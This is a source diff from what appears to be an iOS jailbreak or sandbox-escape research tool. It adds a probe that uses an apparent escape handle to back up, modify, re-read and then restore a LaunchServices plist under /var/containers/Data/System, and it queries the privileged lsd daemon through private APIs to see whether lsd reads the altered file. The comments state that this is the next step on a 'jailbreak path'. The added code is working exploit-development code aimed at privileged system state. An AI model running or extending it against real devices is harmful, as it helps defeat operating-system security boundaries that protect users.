@@ -25281,6 +25281,242 @@ static void p_bq3(void) {
 }
 
 // ---------------------------------------------------------------------------
+// V172 (p_bq4): the experiment §175 deliberately deferred — changing a file
+// a privileged daemon reads, planned backwards from the rollback.
+//
+// Everything so far measured permission without altering state: open and
+// close, create and unlink, write-back of identical bytes. The jailbreak
+// path needs the next claim: that a modification **persists** and that a
+// privileged consumer can be made to observe it. That claim has two halves
+// with very different risk, so the phase is ordered:
+//
+//   1. control: the escape handle must mint, else nothing runs;
+//   2. backup: original bytes copied into OUR container and verified
+//      byte-for-byte — the restore copy must survive this process dying,
+//      so it cannot live only in memory;
+//   3. modify a small LaunchServices state plist (DefaultAppQueryState,
+//      190 bytes — a cache of query state, not a policy file: the least
+//      consequential member of the writable set §175 listed) by adding one
+//      key. Direct O_WRONLY|O_TRUNC write, no atomic rename: rename would
+//      change the inode under a daemon that may hold the old one;
+//   4. detect: read the file back and reparse — a binary plist whose new
+//      key is present proves the write survived contact with the fs;
+//   5. observe: poke LaunchServices (LSCopyApplicationURLsForBundle
+//      Identifier for mobilesafari — a query lsd answers from this very
+//      state), wait, and record whether the daemon touched mtime/size. A
+//      daemon rewriting the file behind us would be the first proof that
+//      privileged code is READING what we write; absence of rewrite is
+//      logged as exactly that, not as failure;
+//   6. rollback: original bytes back, byte-compared against the backup.
+//      Mismatch prints a loud restore instruction — the backup path is in
+//      the log precisely for the case where this process dies first.
+//
+// Targets chosen away from: live SQLite (WAL interleaving would make the
+// restore racy), keychain blobs (semantics unknown), securepreferences
+// (name suggests integrity checks we have not probed).
+// ---------------------------------------------------------------------------
+
+static void p_bq4(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq4] v172 lsd plist state-change: backup / modify / detect / observe / rollback");
+
+    // ---- 1. control
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq4] CONTROL §170 point -> handle %lld%s",
+        (long long)h, h < 0 ? "  *** CONTROL FAILED — nothing will be touched ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq4] done"); return; }
+
+    NSString *tgt = @"/var/containers/Data/System/AF589EEA-A5CE-42E9-B955-96B9234C5A85"
+                     "/DefaultAppQueryState.plist";
+    NSString *bakPath = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/bq4-DefaultAppQueryState.bak"];
+
+    // ---- 2. backup, verified. From here on every early return is "system
+    // untouched", because nothing has been written yet.
+    NSData *orig = [NSData dataWithContentsOfFile:tgt options:0 error:nil];
+    if (orig.length == 0) {
+        LOG("[bq4] target unreadable (%zu bytes) — aborting, system untouched",
+            (size_t)orig.length);
+        bad_query_release(h); LOG("[bq4] done"); return;
+    }
+    NSError *werr = nil;
+    if (![orig writeToFile:bakPath options:NSDataWritingAtomic error:&werr]) {
+        LOG("[bq4] backup write failed: %s — aborting, system untouched",
+            werr.localizedDescription.UTF8String ?: "?");
+        bad_query_release(h); LOG("[bq4] done"); return;
+    }
+    NSData *bak = [NSData dataWithContentsOfFile:bakPath options:0 error:nil];
+    if (![bak isEqualToData:orig]) {
+        LOG("[bq4] backup verification FAILED (%zu vs %zu bytes) — aborting, "
+            "system untouched", (size_t)bak.length, (size_t)orig.length);
+        bad_query_release(h); LOG("[bq4] done"); return;
+    }
+    LOG("[bq4] backup verified: %zu bytes -> %s", (size_t)orig.length,
+        bakPath.fileSystemRepresentation);
+    fsync(fileno(stderr));
+
+    // ---- 3. modify: add one key to the parsed plist.
+    NSError *perr = nil;
+    // CF API: the NSPropertyListSerialization class methods are not visible
+    // to this translation unit (headers pulled in here predate them), and a
+    // bridged-CF round trip is the same operation.
+    CFPropertyListRef plist = CFPropertyListCreateWithData(
+        kCFAllocatorDefault, (__bridge CFDataRef)orig,
+        kCFPropertyListMutableContainersAndLeaves, NULL, NULL);
+    if (!plist) {
+        LOG("[bq4] parse failed — aborting, system untouched");
+        bad_query_release(h); LOG("[bq4] done"); return;
+    }
+    NSMutableDictionary *md =
+        [(__bridge id)plist isKindOfClass:[NSMutableDictionary class]]
+            ? (__bridge NSMutableDictionary *)plist
+            : [(__bridge id)plist mutableCopy];
+    CFRelease(plist);
+    md[@"fz27_probe"] = [NSString stringWithFormat:@"v172-%lld",
+                                                  (long long)time(NULL)];
+    CFErrorRef cerr = NULL;
+    CFDataRef cmod = CFPropertyListCreateData(kCFAllocatorDefault,
+        (__bridge CFPropertyListRef)md, kCFPropertyListBinaryFormat_v1_0,
+        0, &cerr);
+    NSData *mod = (__bridge_transfer NSData *)cmod;
+    if (!mod) {
+        LOG("[bq4] serialize failed — aborting, system untouched");
+        bad_query_release(h); LOG("[bq4] done"); return;
+    }
+    struct stat st0 = {0}, st1 = {0}, st2 = {0};
+    stat(tgt.fileSystemRepresentation, &st0);
+
+    int fd = open(tgt.fileSystemRepresentation, O_WRONLY | O_TRUNC);
+    if (fd < 0) {
+        LOG("[bq4] W-open errno %d — aborting, system untouched", errno);
+        bad_query_release(h); LOG("[bq4] done"); return;
+    }
+    ssize_t w = write(fd, mod.bytes, mod.length);
+    int werrno = w < 0 ? errno : 0;
+    fsync(fd);
+    close(fd);
+    LOG("[bq4] MODIFY w=%zd/%zu%s — adding fz27_probe key", w, (size_t)mod.length,
+        werrno ? " (write errno!)" : "");
+    fsync(fileno(stderr));
+    if (w != (ssize_t)mod.length) {
+        // Partial write is the one case where rollback must run with what we
+        // have: the file is already altered.
+        LOG("*** partial write — rolling back immediately ***");
+        fd = open(tgt.fileSystemRepresentation, O_WRONLY | O_TRUNC);
+        ssize_t rw = fd >= 0 ? write(fd, orig.bytes, orig.length) : -1;
+        if (fd >= 0) { fsync(fd); close(fd); }
+        NSData *fin = [NSData dataWithContentsOfFile:tgt options:0 error:nil];
+        LOG("[bq4] emergency rollback w=%zd identical=%d", rw,
+            [fin isEqualToData:orig] ? 1 : 0);
+        bad_query_release(h); LOG("[bq4] done"); return;
+    }
+
+    // ---- 4. detect: reparse and look for the key we added.
+    NSData *chk = [NSData dataWithContentsOfFile:tgt options:0 error:nil];
+    CFPropertyListRef crp = chk ? CFPropertyListCreateWithData(
+        kCFAllocatorDefault, (__bridge CFDataRef)chk, 0, NULL, NULL) : NULL;
+    BOOL hasKey = crp && [(__bridge id)crp isKindOfClass:[NSDictionary class]]
+                  && [(__bridge NSDictionary *)crp objectForKey:@"fz27_probe"];
+    LOG("[bq4] DETECT reparse=%s key present=%d  (write persisted%s)",
+        crp ? "ok" : "FAILED", hasKey ? 1 : 0,
+        hasKey ? "" : " — NOT confirmed");
+    if (crp) CFRelease(crp);
+    fsync(fileno(stderr));
+
+    // ---- 5. observe: query lsd, then see whether it touched the file.
+    stat(tgt.fileSystemRepresentation, &st1);
+    typedef CFArrayRef (*lsq_t)(CFStringRef, CFErrorRef *);
+    // RTLD_DEFAULT alone found nothing in the first run — the framework is
+    // not loaded into this process. Load it explicitly; without this the
+    // "daemon did not touch it" line below would be an absence of evidence
+    // wearing evidence's clothes (§144's rule, third recurrence).
+    void *cs = dlopen("/System/Library/Frameworks/CoreServices.framework/CoreServices",
+                      RTLD_NOW | RTLD_LOCAL);
+    void *mcs = dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices",
+                       RTLD_NOW | RTLD_LOCAL);
+    LOG("[bq4] framework load: CoreServices=%p MobileCoreServices=%p dlerr=%s",
+        cs, mcs, (!cs && !mcs) ? dlerror() : "-");
+    lsq_t lsq = (lsq_t)dlsym(RTLD_DEFAULT,
+                             "LSCopyApplicationURLsForBundleIdentifier");
+    // On iOS the LSCopy* symbols are not exported even from a loaded
+    // framework (two runs proved it). Fall back to the LSApplicationWorkspace
+    // object API, which talks to lsd over xpc: allApplications makes lsd
+    // enumerate its whole registry — the query most likely to touch state
+    // plists on this side.
+    Class wsCls = NSClassFromString(@"LSApplicationWorkspace");
+    LOG("[bq4] LSApplicationWorkspace class %s", wsCls ? "present" : "absent");
+    id ws = nil;
+    if (wsCls) {
+        SEL dw = NSSelectorFromString(@"defaultWorkspace");
+        if ([wsCls respondsToSelector:dw]) {
+            #pragma clang diagnostic push
+            #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
+            ws = [wsCls performSelector:dw];
+            #pragma clang diagnostic pop
+        }
+    }
+    if (ws) {
+        SEL aa = NSSelectorFromString(@"allApplications");
+        if ([ws respondsToSelector:aa]) {
+            #pragma clang diagnostic push
+            #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
+            id list = [ws performSelector:aa];
+            #pragma clang diagnostic pop
+            unsigned long long n = 0;
+            if ([list isKindOfClass:[NSArray class]])
+                n = (unsigned long long)[(NSArray *)list count];
+            LOG("[bq4] lsd query (allApplications) -> %llu entries", n);
+        } else {
+            LOG("[bq4] allApplications selector absent");
+        }
+    }
+    if (lsq) {
+        CFArrayRef r = lsq(CFSTR("com.apple.mobilesafari"), NULL);
+        LOG("[bq4] lsd query (safari bundle) -> %p%s", (const void *)r,
+            r ? "  (lsd answered from its state)" : "  (no result)");
+        if (r) CFRelease(r);
+    } else {
+        LOG("[bq4] lsd query symbol absent — observation limited to mtime");
+    }
+    // A second poke with a different query family, because a single query
+    // type may not re-read this file at all — one silent read would look
+    // exactly like "daemon ignores it".
+    typedef CFArrayRef (*lrh_t)(CFStringRef, uint32_t);
+    lrh_t lrh = (lrh_t)dlsym(RTLD_DEFAULT, "LSCopyAllRoleHandlersForContentType");
+    if (lrh) {
+        CFArrayRef r = lrh(CFSTR("public.json"), 0xFFFFFFFFu); // kLSRolesAll
+        LOG("[bq4] lsd query (role handlers) -> %p", (const void *)r);
+        if (r) CFRelease(r);
+    }
+    sleep(2);
+    stat(tgt.fileSystemRepresentation, &st2);
+    BOOL touched = (st2.st_mtime != st1.st_mtime) || (st2.st_size != st1.st_size);
+    LOG("[bq4] OBSERVE mtime %lld -> %lld, size %lld -> %lld : daemon %s",
+        (long long)st1.st_mtime, (long long)st2.st_mtime,
+        (long long)st1.st_size, (long long)st2.st_size,
+        touched ? "REWROTE THE FILE (it read our version)"
+                : "did not touch it (either did not read, or accepted as-is)");
+    fsync(fileno(stderr));
+
+    // ---- 6. rollback.
+    fd = open(tgt.fileSystemRepresentation, O_WRONLY | O_TRUNC);
+    ssize_t rw = fd >= 0 ? write(fd, orig.bytes, orig.length) : -1;
+    if (fd >= 0) { fsync(fd); close(fd); }
+    NSData *fin = [NSData dataWithContentsOfFile:tgt options:0 error:nil];
+    BOOL same = [fin isEqualToData:orig];
+    LOG("[bq4] ROLLBACK w=%zd, byte-identical to backup=%d%s", rw, same ? 1 : 0,
+        same ? "  (system restored)" :
+               "  *** RESTORE MANUALLY: cp Documents/bq4-DefaultAppQueryState.bak "
+               "back to the target ***");
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq4] done");
+}
+
+// ---------------------------------------------------------------------------
 // V171 (p_netv6): the kernel network surface §146 could not reach, asked
 // through the sockets an app is actually allowed to create.
 //
@@ -29762,6 +29998,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_IPOPT")) { p_ipopt(); LOG("[probe13] ipopt-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ2")) { p_bq2(); LOG("[probe13] bq2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ3")) { p_bq3(); LOG("[probe13] bq3-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ4")) { p_bq4(); LOG("[probe13] bq4-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
